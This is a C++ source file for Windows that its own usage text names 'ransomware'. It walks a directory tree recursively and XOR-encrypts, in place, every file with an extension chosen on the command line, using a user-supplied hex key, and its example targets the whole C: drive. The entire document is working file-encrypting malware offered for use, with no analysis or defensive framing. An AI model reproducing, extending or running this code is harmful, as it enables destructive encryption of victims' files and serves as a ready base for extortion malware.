#include <iostream>
#include <fstream>
#include <set>
#include <algorithm>
#include <windows.h>

using namespace std;

string getExtension(string fileName){
	size_t n = fileName.rfind('.');
	if(n==string::npos)
		return "";
	return fileName.substr(n+1);
}

string hexToString(string hex){
	for(int i=0; i<hex.size(); i++)
		if(!(hex[i]>='0' && hex[i]<='9')
		&& !(hex[i]>='a' && hex[i]<='z')
		&& !(hex[i]>='A' && hex[i]<='Z')){
			return "";
		}
	string key;
	int i = -(hex.size()%2);
	if(i<0){
		key += (char)stoi(hex.substr(0,1), 0, 16);
		i += 2;
	}
	for(; i<hex.size(); i+=2){
		key += (char)stoi(hex.substr(i,2), 0, 16);
	}
	return key;
}

bool cypherFile(string fileName, string key){
	if(key.size()==0)
		return true;
	fstream file(fileName, ios::in|ios::out|ios::binary);
	if(!file)
		return false;
	char buff[2048];
	unsigned long long k = 0;
	size_t pos = 0;
	while(file){
		file.clear();
		file.seekg(pos);
		file.read(buff, 2048);
		int n = file.gcount();
		if(n>0){
			for(int i=0; i<n; i++)
				buff[i] = buff[i]^key[(k++)%key.size()];
			file.clear();
			file.seekp(pos);
			file.write(buff, n);
		}
		pos += n;
	}
	return true;
}

int getFilesTree(string path, set<string>& extensions, string key){
	WIN32_FIND_DATA data;
	HANDLE handle = FindFirstFile((path+"\\*").c_str(), &data);
	int affectedFiles = 0;
	if(handle!=INVALID_HANDLE_VALUE){
		do{
			string name = data.cFileName;
			if(name=="." || name=="..")
				continue;
			if(data.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY){
				affectedFiles += getFilesTree(path+"\\"+name, extensions, key);
			}else if(extensions.find(getExtension(data.cFileName))!=extensions.end()){
				affectedFiles += cypherFile(path+"\\"+name, key);
			}
		}while(FindNextFile(handle, &data));
		FindClose(handle);
	}
	return affectedFiles;
}

int main(int argc, char** argv){
	set<string> extensions;
	string path, key;
	if(argc>=2){
		for(int i=1; i<argc; i++){
			string arg = argv[i];
			if(arg.size()>=2 && arg[0] == '-' && arg[1] == '-'){
				if(string(argv[i]) == "--help"){
					cout << "Usage: ransomware [--help | [path] [--key HEX_KEY]  <-extension [-extension ...]>]\nExample: ransomware \"C:\" -icf -txt --key 01ff\nThe default path is the current directory" << endl;
					return 0;
				}else if(string(argv[i]) == "--key"){
					if(i==argc-1){
						cout << "Invalid parameter " << (i-1) << ": " << arg << endl;
						return 1;
					}
					if(key!=""){
						cout << "Invalid parameter " << (i-1) << ": " << arg << endl;
						return 2;
					}
					key = hexToString(argv[i+1]);
					if(key==""){
						cout << "Invalid key: " << argv[i+1] << endl;
						return 3;
					}
					i++;
				}else{
					cout << "Invalid parameter " << (i-1) << ": " << arg << endl;
					return 2;
				}
			}else if(arg.size()>=1 && arg[0] == '-'){
				extensions.insert(string(argv[i]).substr(1));
			}else{
				if(path != ""){
					cout << "Invalid parameter " << (i-1) << ": " << arg << endl;
					return 2;
				}
				path = argv[i];
			}
		}
		if(extensions.size()==0){
			cout << "No extensions set" << endl;
			return 4;
		}
		if(key.size()==0){
			cout << "No key set" << endl;
			return 5;
		}
	}else{
		cout << "Usage: ransomware [--help | [path] [--key HEX_KEY]  <-extension [-extension ...]>]\nExample: ransomware \"C:\" -icf -txt --key 01ff\nThe default path is the current directory" << endl;
		return 0;
	}
	if(path == "")
		path = ".";
	int affectedFiles = getFilesTree(path, extensions, key);
	cout << "Finished with " << affectedFiles << " affected files." << endl;
	return 0;
}